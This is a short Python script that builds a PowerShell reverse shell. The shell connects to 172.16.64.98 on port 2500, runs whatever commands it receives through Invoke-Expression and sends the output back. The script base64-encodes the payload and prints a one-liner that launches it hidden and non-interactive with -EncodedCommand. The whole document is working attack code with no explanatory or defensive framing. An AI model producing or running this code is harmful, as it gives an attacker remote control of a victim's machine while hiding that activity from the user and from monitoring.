import base64
# PowerShell reverse shell script

ps_script = """

$client = New-Object System.Net.Sockets.TCPClient('172.16.64.98',2500);

$stream = $client.GetStream();

[byte[]]$bytes = 0..65535|%{0};

while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){

    [string]$command = ([text.encoding]::ASCII.GetString($bytes,0,$i));

    $output = (Invoke-Expression -Command $command 2>&1 | Out-String );

    $sendback = ([text.encoding]::ASCII.GetBytes($output + 'PS ' + (pwd).Path + '> '));

    $stream.Write($sendback, 0, $sendback.Length);

    $stream.Flush()

}

"""




encoded_bytes = ps_script.encode('utf-16le')

encoded_command = base64.b64encode(encoded_bytes).decode()


encoded_command[:300]

print("powershell -NoP -NonI -W Hidden -EncodedCommand" + encoded_command)

